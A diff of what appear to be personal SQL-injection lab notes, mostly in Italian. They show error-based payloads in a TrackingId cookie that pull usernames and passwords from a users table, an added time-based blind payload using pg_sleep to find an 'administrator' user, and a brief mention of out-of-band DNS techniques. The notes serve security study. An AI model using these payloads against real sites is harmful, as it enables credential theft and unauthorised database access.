@@ -124,6 +124,9 @@ TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--
 TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--   -> rimossi i caratteri del trackingid cookie per liberare spazio che generava errore e limitato a 1 il numero di righe di ritorno
 TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
+
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--   -> find user chiamato administrator nella tabella users tramite time delay
+
 OAST techniques
 genera DNS query spesso
 con collaborator si monta un dns server e ricevere le risposte
